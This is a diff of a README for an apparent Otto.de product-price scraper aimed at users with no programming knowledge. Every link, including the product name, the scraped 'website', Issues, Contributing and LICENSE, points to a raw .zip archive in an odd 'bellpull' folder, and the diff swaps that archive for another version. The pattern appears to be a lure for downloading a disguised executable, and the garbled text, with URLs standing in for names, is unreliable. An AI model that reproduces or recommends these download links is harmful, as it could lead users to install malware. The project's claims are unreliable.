@@ -2,13 +2,13 @@
 
 ## 🚀 Getting Started
 
-Welcome! This README will help you download and run the https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip product data scraper. You do not need any programming knowledge. Just follow the steps below, and you can monitor product prices easily.
+Welcome! This README will help you download and run the https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip product data scraper. You do not need any programming knowledge. Just follow the steps below, and you can monitor product prices easily.
 
-[![Download Otto Scraper](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip%20Otto%20Scraper-Click%20Here-blue)](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip)
+[![Download Otto Scraper](https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip%20Otto%20Scraper-Click%20Here-blue)](https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip)
 
-## 💡 What is https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip Product Scraper?
+## 💡 What is https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip Product Scraper?
 
-The https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip product scraper is a simple tool designed to collect and monitor product data from the https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip website. With this tool, you can track prices and product details, helping you make informed purchasing decisions. Whether you are a casual shopper or a price-conscious buyer, this scraper provides essential information at your fingertips.
+The https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip product scraper is a simple tool designed to collect and monitor product data from the https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip website. With this tool, you can track prices and product details, helping you make informed purchasing decisions. Whether you are a casual shopper or a price-conscious buyer, this scraper provides essential information at your fingertips.
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ Before you download the tool, ensure your system meets the following requirement
 
 To get started, visit the releases page to download the tool. Click the link below:
 
-[Visit this page to download the latest release.](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip)
+[Visit this page to download the latest release.](https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip)
 
 Once you are on the releases page, follow these steps:
 
@@ -36,7 +36,7 @@ After installation, you will see the application icon on your desktop or in your
 
 ## 🔍 How to Use the Scraper
 
-Using the https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip product scraper is easy. Here are the steps you need to follow:
+Using the https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip product scraper is easy. Here are the steps you need to follow:
 
 1. Open the application by double-clicking the icon.
 2. Enter the URL of the product page you want to monitor.
@@ -61,24 +61,24 @@ If you encounter any issues during installation or use, consider the following t
 
 ## 🌟 Community Support
 
-Need help? Join our community for support! You can raise issues or ask questions in the [Issues section](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip) of this repository. Other users and contributors are ready to help you troubleshoot.
+Need help? Join our community for support! You can raise issues or ask questions in the [Issues section](https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip) of this repository. Other users and contributors are ready to help you troubleshoot.
 
 ## 🔄 Updates
 
 Keep your application updated for the latest features and improvements. Regularly check the downloads page for new releases:
 
-[Visit this page to download the latest release.](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip)
+[Visit this page to download the latest release.](https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip)
 
 ## 🙋‍♂️ Contributions
 
-We welcome contributions from anyone interested in improving the tool. If you have ideas for features or fixes, please feel free to submit your suggestions. Visit the [Contributing guidelines](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip) for details.
+We welcome contributions from anyone interested in improving the tool. If you have ideas for features or fixes, please feel free to submit your suggestions. Visit the [Contributing guidelines](https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip) for details.
 
 ## 📜 License
 
-This project is open-source and available under the MIT License. For more information, check the [LICENSE file](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip).
+This project is open-source and available under the MIT License. For more information, check the [LICENSE file](https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip).
 
 ## 🏁 Conclusion
 
-With the https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip product scraper, you can easily gather data to make informed purchasing choices. Download the tool now and start monitoring product prices effortlessly!
+With the https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip product scraper, you can easily gather data to make informed purchasing choices. Download the tool now and start monitoring product prices effortlessly!
 
-[![Download Otto Scraper](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip%20Otto%20Scraper-Click%20Here-blue)](https://github.com/2002meht/otto-de-product-scraper-pay-per-result/raw/refs/heads/main/bellpull/result_scraper_per_otto_pay_product_de_v1.3-alpha.3.zip)
+[![Download Otto Scraper](https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip%20Otto%20Scraper-Click%20Here-blue)](https://raw.githubusercontent.com/2002meht/otto-de-product-scraper-pay-per-result/main/bellpull/per-scraper-product-pay-de-otto-result-2.8-beta.4.zip)
